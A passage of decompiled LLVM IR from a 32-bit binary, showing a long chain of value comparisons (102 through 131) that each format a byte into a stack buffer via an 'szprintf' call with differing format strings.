  %v0_804b46f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b46f = zext i8 %v0_804b46f to i32
  store i32 %v1_804b46f, i32* @edx, align 4
  %v0_804b479 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b479 = zext i8 %v0_804b479 to i32
  %v2_804b488 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b488, i32* @ebx, align 4
  %v4_804b49a = call i32 @szprintf(i32 %v2_804b488, i32 ptrtoint ([13 x i8]* @global_var_8058958.137 to i32), i32 %v1_804b479)
  br label %dec_label_pc_804b49f

dec_label_pc_804b49f:                             ; preds = %dec_label_pc_804b469, %dec_label_pc_804b46f
  %v13_804b49f = icmp eq i32 %v2_8049efa, 102
  %v1_804b4a3 = icmp eq i1 %v13_804b49f, false
  br i1 %v1_804b4a3, label %dec_label_pc_804b4d5, label %dec_label_pc_804b4a5

dec_label_pc_804b4a5:                             ; preds = %dec_label_pc_804b49f
  %v0_804b4a5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b4a5 = zext i8 %v0_804b4a5 to i32
  store i32 %v1_804b4a5, i32* @edx, align 4
  %v0_804b4af = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b4af = zext i8 %v0_804b4af to i32
  %v2_804b4be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4be, i32* @ebx, align 4
  %v4_804b4d0 = call i32 @szprintf(i32 %v2_804b4be, i32 ptrtoint ([13 x i8]* @global_var_8058965.138 to i32), i32 %v1_804b4af)
  br label %dec_label_pc_804b4d5

dec_label_pc_804b4d5:                             ; preds = %dec_label_pc_804b49f, %dec_label_pc_804b4a5
  %v13_804b4d5 = icmp eq i32 %v2_8049efa, 103
  %v1_804b4d9 = icmp eq i1 %v13_804b4d5, false
  br i1 %v1_804b4d9, label %dec_label_pc_804b50b, label %dec_label_pc_804b4db

dec_label_pc_804b4db:                             ; preds = %dec_label_pc_804b4d5
  %v0_804b4db = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b4db = zext i8 %v0_804b4db to i32
  store i32 %v1_804b4db, i32* @edx, align 4
  %v0_804b4e5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b4e5 = zext i8 %v0_804b4e5 to i32
  %v2_804b4f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4f4, i32* @ebx, align 4
  %v4_804b506 = call i32 @szprintf(i32 %v2_804b4f4, i32 ptrtoint ([13 x i8]* @global_var_8058972.139 to i32), i32 %v1_804b4e5)
  br label %dec_label_pc_804b50b

dec_label_pc_804b50b:                             ; preds = %dec_label_pc_804b4d5, %dec_label_pc_804b4db
  %v13_804b50b = icmp eq i32 %v2_8049efa, 104
  %v1_804b50f = icmp eq i1 %v13_804b50b, false
  br i1 %v1_804b50f, label %dec_label_pc_804b541, label %dec_label_pc_804b511

dec_label_pc_804b511:                             ; preds = %dec_label_pc_804b50b
  %v0_804b511 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b511 = zext i8 %v0_804b511 to i32
  store i32 %v1_804b511, i32* @edx, align 4
  %v0_804b51b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b51b = zext i8 %v0_804b51b to i32
  %v2_804b52a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b52a, i32* @ebx, align 4
  %v4_804b53c = call i32 @szprintf(i32 %v2_804b52a, i32 ptrtoint ([13 x i8]* @global_var_805897f.140 to i32), i32 %v1_804b51b)
  br label %dec_label_pc_804b541

dec_label_pc_804b541:                             ; preds = %dec_label_pc_804b50b, %dec_label_pc_804b511
  %v13_804b541 = icmp eq i32 %v2_8049efa, 105
  %v1_804b545 = icmp eq i1 %v13_804b541, false
  br i1 %v1_804b545, label %dec_label_pc_804b577, label %dec_label_pc_804b547

dec_label_pc_804b547:                             ; preds = %dec_label_pc_804b541
  %v0_804b547 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b547 = zext i8 %v0_804b547 to i32
  store i32 %v1_804b547, i32* @edx, align 4
  %v0_804b551 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b551 = zext i8 %v0_804b551 to i32
  %v2_804b560 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b560, i32* @ebx, align 4
  %v4_804b572 = call i32 @szprintf(i32 %v2_804b560, i32 ptrtoint ([13 x i8]* @global_var_805898c.141 to i32), i32 %v1_804b551)
  br label %dec_label_pc_804b577

dec_label_pc_804b577:                             ; preds = %dec_label_pc_804b541, %dec_label_pc_804b547
  %v13_804b577 = icmp eq i32 %v2_8049efa, 106
  %v1_804b57b = icmp eq i1 %v13_804b577, false
  br i1 %v1_804b57b, label %dec_label_pc_804b5ad, label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b577
  %v0_804b57d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b57d = zext i8 %v0_804b57d to i32
  store i32 %v1_804b57d, i32* @edx, align 4
  %v0_804b587 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b587 = zext i8 %v0_804b587 to i32
  %v2_804b596 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b596, i32* @ebx, align 4
  %v4_804b5a8 = call i32 @szprintf(i32 %v2_804b596, i32 ptrtoint ([12 x i8]* @global_var_8058999.142 to i32), i32 %v1_804b587)
  br label %dec_label_pc_804b5ad

dec_label_pc_804b5ad:                             ; preds = %dec_label_pc_804b577, %dec_label_pc_804b57d
  %v13_804b5ad = icmp eq i32 %v2_8049efa, 107
  %v1_804b5b1 = icmp eq i1 %v13_804b5ad, false
  br i1 %v1_804b5b1, label %dec_label_pc_804b5e3, label %dec_label_pc_804b5b3

dec_label_pc_804b5b3:                             ; preds = %dec_label_pc_804b5ad
  %v0_804b5b3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b5b3 = zext i8 %v0_804b5b3 to i32
  store i32 %v1_804b5b3, i32* @edx, align 4
  %v0_804b5bd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b5bd = zext i8 %v0_804b5bd to i32
  %v2_804b5cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5cc, i32* @ebx, align 4
  %v4_804b5de = call i32 @szprintf(i32 %v2_804b5cc, i32 ptrtoint ([14 x i8]* @global_var_80589a5.143 to i32), i32 %v1_804b5bd)
  br label %dec_label_pc_804b5e3

dec_label_pc_804b5e3:                             ; preds = %dec_label_pc_804b5ad, %dec_label_pc_804b5b3
  %v13_804b5e3 = icmp eq i32 %v2_8049efa, 108
  %v1_804b5e7 = icmp eq i1 %v13_804b5e3, false
  br i1 %v1_804b5e7, label %dec_label_pc_804b619, label %dec_label_pc_804b5e9

dec_label_pc_804b5e9:                             ; preds = %dec_label_pc_804b5e3
  %v0_804b5e9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b5e9 = zext i8 %v0_804b5e9 to i32
  store i32 %v1_804b5e9, i32* @edx, align 4
  %v0_804b5f3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b5f3 = zext i8 %v0_804b5f3 to i32
  %v2_804b602 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b602, i32* @ebx, align 4
  %v4_804b614 = call i32 @szprintf(i32 %v2_804b602, i32 ptrtoint ([15 x i8]* @global_var_80589b3.144 to i32), i32 %v1_804b5f3)
  br label %dec_label_pc_804b619

dec_label_pc_804b619:                             ; preds = %dec_label_pc_804b5e3, %dec_label_pc_804b5e9
  %v13_804b619 = icmp eq i32 %v2_8049efa, 109
  %v1_804b61d = icmp eq i1 %v13_804b619, false
  br i1 %v1_804b61d, label %dec_label_pc_804b64f, label %dec_label_pc_804b61f

dec_label_pc_804b61f:                             ; preds = %dec_label_pc_804b619
  %v0_804b61f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b61f = zext i8 %v0_804b61f to i32
  store i32 %v1_804b61f, i32* @edx, align 4
  %v0_804b629 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b629 = zext i8 %v0_804b629 to i32
  %v2_804b638 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b638, i32* @ebx, align 4
  %v4_804b64a = call i32 @szprintf(i32 %v2_804b638, i32 ptrtoint ([14 x i8]* @global_var_80589c2.145 to i32), i32 %v1_804b629)
  br label %dec_label_pc_804b64f

dec_label_pc_804b64f:                             ; preds = %dec_label_pc_804b619, %dec_label_pc_804b61f
  %v13_804b64f = icmp eq i32 %v2_8049efa, 110
  %v1_804b653 = icmp eq i1 %v13_804b64f, false
  br i1 %v1_804b653, label %dec_label_pc_804b685, label %dec_label_pc_804b655

dec_label_pc_804b655:                             ; preds = %dec_label_pc_804b64f
  %v0_804b655 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b655 = zext i8 %v0_804b655 to i32
  store i32 %v1_804b655, i32* @edx, align 4
  %v0_804b65f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b65f = zext i8 %v0_804b65f to i32
  %v2_804b66e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b66e, i32* @ebx, align 4
  %v4_804b680 = call i32 @szprintf(i32 %v2_804b66e, i32 ptrtoint ([13 x i8]* @global_var_80589d0.146 to i32), i32 %v1_804b65f)
  br label %dec_label_pc_804b685

dec_label_pc_804b685:                             ; preds = %dec_label_pc_804b64f, %dec_label_pc_804b655
  %v13_804b685 = icmp eq i32 %v2_8049efa, 111
  %v1_804b689 = icmp eq i1 %v13_804b685, false
  br i1 %v1_804b689, label %dec_label_pc_804b6bb, label %dec_label_pc_804b68b

dec_label_pc_804b68b:                             ; preds = %dec_label_pc_804b685
  %v0_804b68b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b68b = zext i8 %v0_804b68b to i32
  store i32 %v1_804b68b, i32* @edx, align 4
  %v0_804b695 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b695 = zext i8 %v0_804b695 to i32
  %v2_804b6a4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6a4, i32* @ebx, align 4
  %v4_804b6b6 = call i32 @szprintf(i32 %v2_804b6a4, i32 ptrtoint ([14 x i8]* @global_var_80589dd.147 to i32), i32 %v1_804b695)
  br label %dec_label_pc_804b6bb

dec_label_pc_804b6bb:                             ; preds = %dec_label_pc_804b685, %dec_label_pc_804b68b
  %v10_804b6bb = icmp eq i32 %v2_8049efa, 112
  %v1_804b6bf = icmp eq i1 %v10_804b6bb, false
  br i1 %v1_804b6bf, label %dec_label_pc_804b6f1, label %dec_label_pc_804b6c1

dec_label_pc_804b6c1:                             ; preds = %dec_label_pc_804b6bb
  %v0_804b6c1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b6c1 = zext i8 %v0_804b6c1 to i32
  store i32 %v1_804b6c1, i32* @edx, align 4
  %v0_804b6cb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b6cb = zext i8 %v0_804b6cb to i32
  %v2_804b6da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6da, i32* @ebx, align 4
  %v4_804b6ec = call i32 @szprintf(i32 %v2_804b6da, i32 ptrtoint ([15 x i8]* @global_var_80589eb.148 to i32), i32 %v1_804b6cb)
  br label %dec_label_pc_804b6f1

dec_label_pc_804b6f1:                             ; preds = %dec_label_pc_804b6bb, %dec_label_pc_804b6c1
  %v13_804b6f1 = icmp eq i32 %v2_8049efa, 113
  %v1_804b6f5 = icmp eq i1 %v13_804b6f1, false
  br i1 %v1_804b6f5, label %dec_label_pc_804b727, label %dec_label_pc_804b6f7

dec_label_pc_804b6f7:                             ; preds = %dec_label_pc_804b6f1
  %v0_804b6f7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b6f7 = zext i8 %v0_804b6f7 to i32
  store i32 %v1_804b6f7, i32* @edx, align 4
  %v0_804b701 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b701 = zext i8 %v0_804b701 to i32
  %v2_804b710 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b710, i32* @ebx, align 4
  %v4_804b722 = call i32 @szprintf(i32 %v2_804b710, i32 ptrtoint ([13 x i8]* @global_var_80589fa.149 to i32), i32 %v1_804b701)
  br label %dec_label_pc_804b727

dec_label_pc_804b727:                             ; preds = %dec_label_pc_804b6f1, %dec_label_pc_804b6f7
  %v13_804b727 = icmp eq i32 %v2_8049efa, 114
  %v1_804b72b = icmp eq i1 %v13_804b727, false
  br i1 %v1_804b72b, label %dec_label_pc_804b75d, label %dec_label_pc_804b72d

dec_label_pc_804b72d:                             ; preds = %dec_label_pc_804b727
  %v0_804b72d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b72d = zext i8 %v0_804b72d to i32
  store i32 %v1_804b72d, i32* @edx, align 4
  %v0_804b737 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b737 = zext i8 %v0_804b737 to i32
  %v2_804b746 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b746, i32* @ebx, align 4
  %v4_804b758 = call i32 @szprintf(i32 %v2_804b746, i32 ptrtoint ([14 x i8]* @global_var_8058a07.150 to i32), i32 %v1_804b737)
  br label %dec_label_pc_804b75d

dec_label_pc_804b75d:                             ; preds = %dec_label_pc_804b727, %dec_label_pc_804b72d
  %v13_804b75d = icmp eq i32 %v2_8049efa, 115
  %v1_804b761 = icmp eq i1 %v13_804b75d, false
  br i1 %v1_804b761, label %dec_label_pc_804b793, label %dec_label_pc_804b763

dec_label_pc_804b763:                             ; preds = %dec_label_pc_804b75d
  %v0_804b763 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b763 = zext i8 %v0_804b763 to i32
  store i32 %v1_804b763, i32* @edx, align 4
  %v0_804b76d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b76d = zext i8 %v0_804b76d to i32
  %v2_804b77c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b77c, i32* @ebx, align 4
  %v4_804b78e = call i32 @szprintf(i32 %v2_804b77c, i32 ptrtoint ([13 x i8]* @global_var_8058a15.151 to i32), i32 %v1_804b76d)
  br label %dec_label_pc_804b793

dec_label_pc_804b793:                             ; preds = %dec_label_pc_804b75d, %dec_label_pc_804b763
  %v13_804b793 = icmp eq i32 %v2_8049efa, 116
  %v1_804b797 = icmp eq i1 %v13_804b793, false
  br i1 %v1_804b797, label %dec_label_pc_804b7c9, label %dec_label_pc_804b799

dec_label_pc_804b799:                             ; preds = %dec_label_pc_804b793
  %v0_804b799 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b799 = zext i8 %v0_804b799 to i32
  store i32 %v1_804b799, i32* @edx, align 4
  %v0_804b7a3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b7a3 = zext i8 %v0_804b7a3 to i32
  %v2_804b7b2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b2, i32* @ebx, align 4
  %v4_804b7c4 = call i32 @szprintf(i32 %v2_804b7b2, i32 ptrtoint ([13 x i8]* @global_var_8058a22.152 to i32), i32 %v1_804b7a3)
  br label %dec_label_pc_804b7c9

dec_label_pc_804b7c9:                             ; preds = %dec_label_pc_804b793, %dec_label_pc_804b799
  %v13_804b7c9 = icmp eq i32 %v2_8049efa, 117
  %v1_804b7cd = icmp eq i1 %v13_804b7c9, false
  br i1 %v1_804b7cd, label %dec_label_pc_804b7ff, label %dec_label_pc_804b7cf

dec_label_pc_804b7cf:                             ; preds = %dec_label_pc_804b7c9
  %v0_804b7cf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b7cf = zext i8 %v0_804b7cf to i32
  store i32 %v1_804b7cf, i32* @edx, align 4
  %v0_804b7d9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b7d9 = zext i8 %v0_804b7d9 to i32
  %v2_804b7e8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7e8, i32* @ebx, align 4
  %v4_804b7fa = call i32 @szprintf(i32 %v2_804b7e8, i32 ptrtoint ([14 x i8]* @global_var_8058a2f.153 to i32), i32 %v1_804b7d9)
  br label %dec_label_pc_804b7ff

dec_label_pc_804b7ff:                             ; preds = %dec_label_pc_804b7c9, %dec_label_pc_804b7cf
  %v13_804b7ff = icmp eq i32 %v2_8049efa, 118
  %v1_804b803 = icmp eq i1 %v13_804b7ff, false
  br i1 %v1_804b803, label %dec_label_pc_804b835, label %dec_label_pc_804b805

dec_label_pc_804b805:                             ; preds = %dec_label_pc_804b7ff
  %v0_804b805 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b805 = zext i8 %v0_804b805 to i32
  store i32 %v1_804b805, i32* @edx, align 4
  %v0_804b80f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b80f = zext i8 %v0_804b80f to i32
  %v2_804b81e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b81e, i32* @ebx, align 4
  %v4_804b830 = call i32 @szprintf(i32 %v2_804b81e, i32 ptrtoint ([14 x i8]* @global_var_8058a3d.154 to i32), i32 %v1_804b80f)
  br label %dec_label_pc_804b835

dec_label_pc_804b835:                             ; preds = %dec_label_pc_804b7ff, %dec_label_pc_804b805
  %v13_804b835 = icmp eq i32 %v2_8049efa, 119
  %v1_804b839 = icmp eq i1 %v13_804b835, false
  br i1 %v1_804b839, label %dec_label_pc_804b86b, label %dec_label_pc_804b83b

dec_label_pc_804b83b:                             ; preds = %dec_label_pc_804b835
  %v0_804b83b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b83b = zext i8 %v0_804b83b to i32
  store i32 %v1_804b83b, i32* @edx, align 4
  %v0_804b845 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b845 = zext i8 %v0_804b845 to i32
  %v2_804b854 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b854, i32* @ebx, align 4
  %v4_804b866 = call i32 @szprintf(i32 %v2_804b854, i32 ptrtoint ([14 x i8]* @global_var_8058a4b.155 to i32), i32 %v1_804b845)
  br label %dec_label_pc_804b86b

dec_label_pc_804b86b:                             ; preds = %dec_label_pc_804b835, %dec_label_pc_804b83b
  %v13_804b86b = icmp eq i32 %v2_8049efa, 120
  %v1_804b86f = icmp eq i1 %v13_804b86b, false
  br i1 %v1_804b86f, label %dec_label_pc_804b8a1, label %dec_label_pc_804b871

dec_label_pc_804b871:                             ; preds = %dec_label_pc_804b86b
  %v0_804b871 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b871 = zext i8 %v0_804b871 to i32
  store i32 %v1_804b871, i32* @edx, align 4
  %v0_804b87b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b87b = zext i8 %v0_804b87b to i32
  %v2_804b88a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b88a, i32* @ebx, align 4
  %v4_804b89c = call i32 @szprintf(i32 %v2_804b88a, i32 ptrtoint ([15 x i8]* @global_var_8058a59.156 to i32), i32 %v1_804b87b)
  br label %dec_label_pc_804b8a1

dec_label_pc_804b8a1:                             ; preds = %dec_label_pc_804b86b, %dec_label_pc_804b871
  %v13_804b8a1 = icmp eq i32 %v2_8049efa, 121
  %v1_804b8a5 = icmp eq i1 %v13_804b8a1, false
  br i1 %v1_804b8a5, label %dec_label_pc_804b8d7, label %dec_label_pc_804b8a7

dec_label_pc_804b8a7:                             ; preds = %dec_label_pc_804b8a1
  %v0_804b8a7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b8a7 = zext i8 %v0_804b8a7 to i32
  store i32 %v1_804b8a7, i32* @edx, align 4
  %v0_804b8b1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b8b1 = zext i8 %v0_804b8b1 to i32
  %v2_804b8c0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8c0, i32* @ebx, align 4
  %v4_804b8d2 = call i32 @szprintf(i32 %v2_804b8c0, i32 ptrtoint ([15 x i8]* @global_var_80589b3.144 to i32), i32 %v1_804b8b1)
  br label %dec_label_pc_804b8d7

dec_label_pc_804b8d7:                             ; preds = %dec_label_pc_804b8a1, %dec_label_pc_804b8a7
  %v13_804b8d7 = icmp eq i32 %v2_8049efa, 122
  %v1_804b8db = icmp eq i1 %v13_804b8d7, false
  br i1 %v1_804b8db, label %dec_label_pc_804b90d, label %dec_label_pc_804b8dd

dec_label_pc_804b8dd:                             ; preds = %dec_label_pc_804b8d7
  %v0_804b8dd = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b8dd = zext i8 %v0_804b8dd to i32
  store i32 %v1_804b8dd, i32* @edx, align 4
  %v0_804b8e7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b8e7 = zext i8 %v0_804b8e7 to i32
  %v2_804b8f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8f6, i32* @ebx, align 4
  %v4_804b908 = call i32 @szprintf(i32 %v2_804b8f6, i32 ptrtoint ([14 x i8]* @global_var_8058a68.157 to i32), i32 %v1_804b8e7)
  br label %dec_label_pc_804b90d

dec_label_pc_804b90d:                             ; preds = %dec_label_pc_804b8d7, %dec_label_pc_804b8dd
  %v13_804b90d = icmp eq i32 %v2_8049efa, 123
  %v1_804b911 = icmp eq i1 %v13_804b90d, false
  br i1 %v1_804b911, label %dec_label_pc_804b943, label %dec_label_pc_804b913

dec_label_pc_804b913:                             ; preds = %dec_label_pc_804b90d
  %v0_804b913 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b913 = zext i8 %v0_804b913 to i32
  store i32 %v1_804b913, i32* @edx, align 4
  %v0_804b91d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b91d = zext i8 %v0_804b91d to i32
  %v2_804b92c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b92c, i32* @ebx, align 4
  %v4_804b93e = call i32 @szprintf(i32 %v2_804b92c, i32 ptrtoint ([12 x i8]* @global_var_8058a76.158 to i32), i32 %v1_804b91d)
  br label %dec_label_pc_804b943

dec_label_pc_804b943:                             ; preds = %dec_label_pc_804b90d, %dec_label_pc_804b913
  %v13_804b943 = icmp eq i32 %v2_8049efa, 124
  %v1_804b947 = icmp eq i1 %v13_804b943, false
  br i1 %v1_804b947, label %dec_label_pc_804b979, label %dec_label_pc_804b949

dec_label_pc_804b949:                             ; preds = %dec_label_pc_804b943
  %v0_804b949 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b949 = zext i8 %v0_804b949 to i32
  store i32 %v1_804b949, i32* @edx, align 4
  %v0_804b953 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b953 = zext i8 %v0_804b953 to i32
  %v2_804b962 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b962, i32* @ebx, align 4
  %v4_804b974 = call i32 @szprintf(i32 %v2_804b962, i32 ptrtoint ([14 x i8]* @global_var_8058a82.159 to i32), i32 %v1_804b953)
  br label %dec_label_pc_804b979

dec_label_pc_804b979:                             ; preds = %dec_label_pc_804b943, %dec_label_pc_804b949
  %v13_804b979 = icmp eq i32 %v2_8049efa, 125
  %v1_804b97d = icmp eq i1 %v13_804b979, false
  br i1 %v1_804b97d, label %dec_label_pc_804b9af, label %dec_label_pc_804b97f

dec_label_pc_804b97f:                             ; preds = %dec_label_pc_804b979
  %v0_804b97f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b97f = zext i8 %v0_804b97f to i32
  store i32 %v1_804b97f, i32* @edx, align 4
  %v0_804b989 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b989 = zext i8 %v0_804b989 to i32
  %v2_804b998 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b998, i32* @ebx, align 4
  %v4_804b9aa = call i32 @szprintf(i32 %v2_804b998, i32 ptrtoint ([14 x i8]* @global_var_8058a90.160 to i32), i32 %v1_804b989)
  br label %dec_label_pc_804b9af

dec_label_pc_804b9af:                             ; preds = %dec_label_pc_804b979, %dec_label_pc_804b97f
  %v13_804b9af = icmp eq i32 %v2_8049efa, 126
  %v1_804b9b3 = icmp eq i1 %v13_804b9af, false
  br i1 %v1_804b9b3, label %dec_label_pc_804b9e5, label %dec_label_pc_804b9b5

dec_label_pc_804b9b5:                             ; preds = %dec_label_pc_804b9af
  %v0_804b9b5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b9b5 = zext i8 %v0_804b9b5 to i32
  store i32 %v1_804b9b5, i32* @edx, align 4
  %v0_804b9bf = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b9bf = zext i8 %v0_804b9bf to i32
  %v2_804b9ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9ce, i32* @ebx, align 4
  %v4_804b9e0 = call i32 @szprintf(i32 %v2_804b9ce, i32 ptrtoint ([14 x i8]* @global_var_8058a82.159 to i32), i32 %v1_804b9bf)
  br label %dec_label_pc_804b9e5

dec_label_pc_804b9e5:                             ; preds = %dec_label_pc_804b9af, %dec_label_pc_804b9b5
  %v13_804b9e5 = icmp eq i32 %v2_8049efa, 127
  %v1_804b9e9 = icmp eq i1 %v13_804b9e5, false
  br i1 %v1_804b9e9, label %dec_label_pc_804ba1b, label %dec_label_pc_804b9eb

dec_label_pc_804b9eb:                             ; preds = %dec_label_pc_804b9e5
  %v0_804b9eb = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b9eb = zext i8 %v0_804b9eb to i32
  store i32 %v1_804b9eb, i32* @edx, align 4
  %v0_804b9f5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b9f5 = zext i8 %v0_804b9f5 to i32
  %v2_804ba04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba04, i32* @ebx, align 4
  %v4_804ba16 = call i32 @szprintf(i32 %v2_804ba04, i32 ptrtoint ([14 x i8]* @global_var_8058a9e.161 to i32), i32 %v1_804b9f5)
  br label %dec_label_pc_804ba1b

dec_label_pc_804ba1b:                             ; preds = %dec_label_pc_804b9e5, %dec_label_pc_804b9eb
  %v10_804ba1b = icmp eq i32 %v2_8049efa, 128
  %v1_804ba22 = icmp eq i1 %v10_804ba1b, false
  br i1 %v1_804ba22, label %dec_label_pc_804ba54, label %dec_label_pc_804ba24

dec_label_pc_804ba24:                             ; preds = %dec_label_pc_804ba1b
  %v0_804ba24 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba24 = zext i8 %v0_804ba24 to i32
  store i32 %v1_804ba24, i32* @edx, align 4
  %v0_804ba2e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ba2e = zext i8 %v0_804ba2e to i32
  %v2_804ba3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba3d, i32* @ebx, align 4
  %v4_804ba4f = call i32 @szprintf(i32 %v2_804ba3d, i32 ptrtoint ([14 x i8]* @global_var_8058aac.162 to i32), i32 %v1_804ba2e)
  br label %dec_label_pc_804ba54

dec_label_pc_804ba54:                             ; preds = %dec_label_pc_804ba1b, %dec_label_pc_804ba24
  %v13_804ba54 = icmp eq i32 %v2_8049efa, 129
  %v1_804ba5b = icmp eq i1 %v13_804ba54, false
  br i1 %v1_804ba5b, label %dec_label_pc_804ba8d, label %dec_label_pc_804ba5d

dec_label_pc_804ba5d:                             ; preds = %dec_label_pc_804ba54
  %v0_804ba5d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba5d = zext i8 %v0_804ba5d to i32
  store i32 %v1_804ba5d, i32* @edx, align 4
  %v0_804ba67 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ba67 = zext i8 %v0_804ba67 to i32
  %v2_804ba76 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba76, i32* @ebx, align 4
  %v4_804ba88 = call i32 @szprintf(i32 %v2_804ba76, i32 ptrtoint ([14 x i8]* @global_var_8058aba.163 to i32), i32 %v1_804ba67)
  br label %dec_label_pc_804ba8d

dec_label_pc_804ba8d:                             ; preds = %dec_label_pc_804ba54, %dec_label_pc_804ba5d
  %v13_804ba8d = icmp eq i32 %v2_8049efa, 130
  %v1_804ba94 = icmp eq i1 %v13_804ba8d, false
  br i1 %v1_804ba94, label %dec_label_pc_804bac6, label %dec_label_pc_804ba96

dec_label_pc_804ba96:                             ; preds = %dec_label_pc_804ba8d
  %v0_804ba96 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba96 = zext i8 %v0_804ba96 to i32
  store i32 %v1_804ba96, i32* @edx, align 4
  %v0_804baa0 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804baa0 = zext i8 %v0_804baa0 to i32
  %v2_804baaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baaf, i32* @ebx, align 4
  %v4_804bac1 = call i32 @szprintf(i32 %v2_804baaf, i32 ptrtoint ([14 x i8]* @global_var_8058ac8.164 to i32), i32 %v1_804baa0)
  br label %dec_label_pc_804bac6

dec_label_pc_804bac6:                             ; preds = %dec_label_pc_804ba8d, %dec_label_pc_804ba96
  %v13_804bac6 = icmp eq i32 %v2_8049efa, 131
  %v1_804bacd = icmp eq i1 %v13_804bac6, false
  br i1 %v1_804bacd, label %dec_label_pc_804baff, label %dec_label_pc_804bacf

dec_label_pc_804bacf:                             ; preds = %dec_label_pc_804bac6
  %v0_804bacf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bacf = zext i8 %v0_804bacf to i32
  store i32 %v1_804bacf, i32* @edx, align 4
  %v0_804bad9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bad9 = zext i8 %v0_804bad9 to i32
  %v2_804bae8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bae8, i32* @ebx, align 4
  %v4_804bafa = call i32 @szprintf(i32 %v2_804bae8, i32 ptrtoint ([14 x i8]* @global_var_8058ad6.165 to i32), i32 %v1_804bad9)
